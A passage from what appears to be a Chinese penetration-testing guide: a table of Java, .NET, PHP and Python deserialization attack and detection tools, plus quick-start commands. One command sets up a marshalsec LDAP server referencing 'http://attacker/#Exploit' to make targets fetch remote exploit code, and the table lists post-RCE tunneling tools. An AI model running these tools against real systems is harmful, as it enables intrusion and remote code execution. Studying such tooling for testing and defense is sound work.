## 十六、工具链表

| 工具 | 语言/平台 | 用途 |
|------|----------|------|
| ysoserial | Java | 反序列化 Payload 生成（CC/CB/Spring/Groovy/JDK-only 全链） |
| ysoserial.net | .NET | .NET 反序列化 Payload（ViewState/BinaryFormatter 等） |
| phpggc | PHP | PHP POP 链生成（框架链 + phar 格式） |
| marshalsec | Java | JNDI/LDAP/RMI 服务端（JNDI 注入辅助） |
| JNDI-Injection-Exploit / rogue-jndi | Java | 高版本 JDK JNDI 绕过（本地工厂） |
| GadgetProbe | Java | 黑盒探测 classpath 类存在性 |
| SerializationDumper | Java | Java 序列化流协议解析/手工改包 |
| Burp 插件（JavaDeserializationScanner 等） | Java | 流量侧反序列化检测 |
| ShiroExploit / ShiroAttack2 | Java | Shiro rememberMe 密钥爆破 + 一键利用 |
| fastjson 系列工具 / vulhub poc.py | Java | Fastjson 版本探测/1.2.83 Gadget-free 利用 |
| weblogicScanner / wls 系列 | Java | WebLogic T3/IIOP 扫描利用 |
| Metasploit（java_deserialization 模块） | 通用 | 批量反序列化检测 |
| Nuclei + 模板 | 通用 | CVE 模板化扫描（Log4Shell/反序列化） |
| CodeQL / Semgrep | 静态分析 | 数据流漏洞挖掘 / 反序列化规则扫描 |
| picklescan / fickling | Python | pickle 恶意流扫描 / 逆向分析 |
| pickletools | Python | 标准库 opcode 解析 |
| SerializationDumper 姊妹：Burp Serialization 系列 | Java | 流量改包重放 |
| McpSafetyScanner | AI/MCP | MCP 服务器安全审计 |
| 内网工具（frp/ew/chisel/ligolo-ng） | 通用 | RCE 后代理与横向 |

### 16.1 关键工具快速上手
```bash
# ysoserial
java -jar ysoserial.jar -h                     # 列出全部 Payload
# marshalsec JNDI
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker/#Exploit" 1389
# GadgetProbe（探测目标 classpath）
java -jar GadgetProbe.jar -u http://target/endpoint -p <base64payload> -d "Header: v"
# phpggc
./phpggc -l | grep -i laravel
# picklescan
pip install picklescan && picklescan scan --file model.pkl
```

